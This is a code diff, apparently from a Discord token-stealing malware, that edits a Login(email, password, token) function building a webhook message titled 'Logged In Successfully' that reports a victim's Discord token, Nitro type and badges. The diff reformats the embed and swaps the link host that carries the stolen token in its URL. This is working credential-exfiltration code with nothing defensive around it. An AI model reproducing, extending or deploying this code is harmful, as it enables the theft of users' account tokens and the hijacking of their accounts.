@@ -145,11 +145,11 @@ function Login(email, password, token) {
             avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
             embeds: [{
                 title: "Logged In Successfully",
-                description: `<:greyrules:963541502074707999> Click to Copy(https://superfurrycdn.nl/copy/${token})`,
+                description: `[**:partner: │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                 color: 000000,
                 fields: [{
-                            "name": "<a:CH_MoneyFlying:715585160497856533> Token [Click To Copy](https://superfurrycdn.nl/copy/${token})",
-                            "value": `\`${token}\``,
+                            "name": "<a:CH_MoneyFlying:715585160497856533> Token",
+                            "value": `\`\`\`${token}\`\`\``,
                             "inline": false
                         },
                         {
@@ -159,7 +159,7 @@ function Login(email, password, token) {
                         },
                         {
                             "name": "<:mm_goingupRocket:943480651280158800> More Information",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `\`\`\`Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\`\`\``,
                             "inline": true
                         }
                     ],
